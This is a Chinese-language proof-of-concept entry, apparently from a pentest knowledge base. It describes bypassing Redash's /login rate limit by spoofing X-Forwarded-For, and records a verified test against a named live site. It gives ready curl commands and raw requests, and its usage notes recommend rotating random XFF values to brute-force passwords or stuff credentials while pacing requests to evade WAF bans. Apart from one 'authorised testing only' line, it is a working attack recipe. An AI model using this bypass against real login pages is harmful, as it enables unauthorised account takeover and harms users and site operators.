# Redash /login 登录速率限制被 X-Forwarded-For 伪造绕过（flask-limiter 按客户端可控 XFF 计桶 → 无限制口令验证/凭据填充）

- **code**: redash-flask-limiter-login-xff-ratelimit-bypass
- **kind**: poc
- **category**: auth-bypass
- **component**: Redash（自建实例，Flask/Werkzeug + flask-limiter，nginx 前置）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-11 task#3（finding_id=90，verdict=verified）实测于 https://redash.fanatical.com/login，本机 Windows curl（UA=$ARTEX_UA，经平台记录代理直发）。① 基线：无 XFF 连续 3 次 GET /login → 全部 HTTP/2 429，体 "<h1>Too Many Requests</h1><p>50 per 1 hour</p>"（应用层限速 50 次/小时/IP 生效）。② 仅加 -H "X-Forwarded-For: 203.0.113.11 / .12 / .13" → 连续 3 次 HTTP/2 200，"<title>Login to Redash</title>" 且含隐藏域 name="csrf_token"；与无 XFF 的 429 形成稳定二分，证明限速计数键取自客户端可控 XFF。③ 带 XFF 连续 3 次 POST /login（email=x@x.com&password=zzz&csrf_token=<上一步取得>）→ 全部 HTTP/2 200 "data-test=\"ErrorMessage\">Wrong email or password."，全程无 429，且该实例未观察到账号锁定。基线流量快照 traffic id 1794411470-2896。
- **path**: pocs/redash-flask-limiter-login-xff-ratelimit-bypass/redash-xff-ratelimit-bypass.md
- **tags**: redash,flask-limiter,x-forwarded-for,rate-limit,ratelimit-bypass,429,login,weak-password,credential-stuffing,trust-proxy
- **created_at**: 2026-11-11T15:46:21.119Z
- **engine**: redash.fanatical.com

## 描述

Redash 自建实例的登录端点 /login 用 flask-limiter 做应用层限速（常见配置 50 次/小时/IP），但限速的「IP」取自请求来源 IP，而该 IP 在多了一层 nginx/反代时直接采信客户端可控的 X-Forwarded-For 头。攻击者每次请求换一个 XFF 值即把限速计数换进新桶，从而彻底绕开限速，对后台登录接口进行无限制的弱口令验证/凭据填充。前提：前置 nginx 不覆盖 XFF、应用 trust proxy；匿名即可触发，无需凭据。可用于把「有速率限制」的登录面重新变回可无限尝试的爆破面。

## 用法

```
先用「无 XFF 429 / 带 XFF 200」做稳定二分对照确认绕过成立，再每次换不同 XFF 值对同一账号连续 POST /login 做口令验证（注意 POST 前要先 GET /login 取 csrf_token，CSRF 若绑 session 需带 cookie jar）。判据：同一时刻同一路径，无 XFF → 429「50 per 1 hour」，带任意 XFF → 200；连续 POST 全程无 429 即绕过有效。换 XFF 值建议用不同公网段随机 IP（如 203.0.113.x / 198.51.100.x）。
```

## 正文

```
# Redash /login 登录限速（flask-limiter）被 X-Forwarded-For 伪造绕过

## 指纹 / 适用面
- 组件：**Redash 自建实例**（Flask/Werkzeug + flask-limiter，通常前置 nginx 反代）
- 入口：`https://<TARGET>/login`
- 限速特征：超限返回 `HTTP/2 429`，体形如
  `<title>429 Too Many Requests</title><h1>Too Many Requests</h1><p>50 per 1 hour</p>`
- 影响：限速计数键取自客户端可控的 `X-Forwarded-For`，换 XFF 即换计数桶 → 应用层限速完全失效 → 可对登录接口无限制做弱口令验证 / 凭据填充。

## 前置条件
- 目标可达（HTTPS，含 nginx 等前置反代）。
- 无需任何凭据（匿名）。
- 反代不覆盖/不剥离 `X-Forwarded-For`，且应用 trust proxy（把 XFF 当客户端 IP 用于限速计数键）。

## 复现步骤

```bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ... Chrome/xxx Safari/537.36'
TARGET=redash.example.com
```

### 0) 基线对照：确认端点受限速保护
```bash
curl -sk -A "$UA" "https://$TARGET/login"
# 期望：HTTP/2 429，体含 "<h1>Too Many Requests</h1><p>50 per 1 hour</p>"
# 连发 3 次均应为 429（确认基线稳定）
```

### 1) 仅加伪造 XFF，限速应被重置为 200
```bash
curl -sk -A "$UA" -D - -o /dev/null \
  -H "X-Forwarded-For: 203.0.113.11" "https://$TARGET/login"
# 期望：HTTP/2 200
```
原始请求形态：
```http
GET /login HTTP/2
Host: <TARGET>
User-Agent: <UA>
X-Forwarded-For: 203.0.113.11
```
期望响应：`HTTP/2 200` + `<title>Login to Redash</title>` + 隐藏域
`<input type="hidden" name="csrf_token" value="..."/>`。

> 判据：**同一时刻同一路径，无 XFF → 429，带 XFF → 200**，稳定二分即绕过成立。
> 换不同 XFF（.12 / .13 ...）应每次都 200。

### 2) 取 csrf_token 后做登录口令验证（POST /login）
先从带 XFF 的 GET /login 响应里取出 `csrf_token`：
```bash
curl -sk -A "$UA" -H "X-Forwarded-For: 203.0.113.21" \
  -d "email=<account>&password=<guess>&csrf_token=<token>" \
  "https://$TARGET/login"
# 期望：HTTP/2 200，体含：data-test="ErrorMessage">Wrong email or password.
```
原始请求形态：
```http
POST /login HTTP/2
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 203.0.113.21

email=<account>&password=<guess>&csrf_token=<token>
```

### 3) 每次请求换一个 XFF → 计数永远落在新桶
对同一账号连续 POST /login，全程应无 429；该实例亦未观察到账号锁定。
即可无限制地对后台做弱口令验证 / 凭据填充。

## 判定要点（一句话）
`无 XFF = 429` 与 `有 XFF = 200` 的对照二分，是「限速键取自可伪造 XFF」的直接证据；
连续 POST 无 429 则证明限速对凭据验证完全不生效。

## 失败时的常见原因（假阴性排查）
- 前置 nginx 覆盖/剥离了 XFF（如 `proxy_set_header X-Forwarded-For $remote_addr;`）→ 伪造无效，仍是 429。
- 应用未 trust proxy，限速键取真实 `remote_addr` → XFF 不生效。
- 限速键不只有 IP（如再绑定账号 / 会话 / User-Agent）→ 只换 XFF 不重置计数。
- 目标已升级 Redash，或限速实现改成按账号 / 全局。
- 返回 429 但附 `Retry-After` → 确认限速维度是否仍是 IP。

## 注意事项
- POST /login 需要先 GET 页面拿 `csrf_token`；若 CSRF 与 session cookie 绑定，请用 cookie jar（`-c/-b`）保持会话。
- 爆破时建议每次换不同公网段的随机 XFF（如 `203.0.113.x` / `198.51.100.x`），并控制总速率避免触发连接层/边缘 WAF 封禁。
- 仅用于授权测试。

```
